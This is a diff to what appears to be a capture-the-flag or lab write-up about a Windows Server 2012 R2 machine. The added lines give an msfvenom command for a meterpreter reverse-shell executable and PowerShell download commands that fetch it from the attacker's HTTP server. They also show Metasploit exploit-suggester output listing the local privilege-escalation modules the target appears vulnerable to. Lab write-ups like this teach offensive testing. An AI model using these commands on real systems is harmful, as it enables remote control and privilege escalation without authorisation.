@@ -62,6 +62,22 @@ __VIEWSTATE=mxGh%2BdQ%2F%2BpArh2IP5hEYlvCLap4USWw8NMWpW%2FCdFy6ebKKcxpebQBn520XB
 
 ### What is the OS version of this windows machine?
 
-- Generate shellcode with `msfvenom`
+- Generate shellcode with `msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f exe > shell.exe`
+- Transport the shell to target machine
+    - `python3 -m http.server 8081` to share out all files in current directory
+    - `powershell.exe -Command "Invoke-WebRequest -Uri http://<attack ip>:<port>/shell.exe -OutFile shell.exe"` to download from the http server
 
-> <code>systeminfo</code> returns shows the OS version is 
+> <code>systeminfo</code> returns shows the OS version is **Windows 2012 R2 (6.3 Build 9600)**
+
+```
+#   Name                                                           Potentially Vulnerable?  Check Result
+ -   ----                                                           -----------------------  ------------
+ 1   exploit/windows/local/bypassuac_comhijack                      Yes                      The target appears to be vulnerable.
+ 2   exploit/windows/local/bypassuac_eventvwr                       Yes                      The target appears to be vulnerable.
+ 3   exploit/windows/local/bypassuac_sluihijack                     Yes                      The target appears to be vulnerable.
+ 4   exploit/windows/local/cve_2020_0787_bits_arbitrary_file_move   Yes                      The service is running, but could not be validated. Vulnerable Windows 8.1/Windows Server 2012 R2 build detected!
+ 5   exploit/windows/local/ms16_032_secondary_logon_handle_privesc  Yes                      The service is running, but could not be validated.
+ 6   exploit/windows/local/ms16_075_reflection                      Yes                      The target appears to be vulnerable.
+ 7   exploit/windows/local/ms16_075_reflection_juicy                Yes                      The target appears to be vulnerable.
+ 8   exploit/windows/local/tokenmagic                               Yes                      The target appears to be vulnerable.
+```
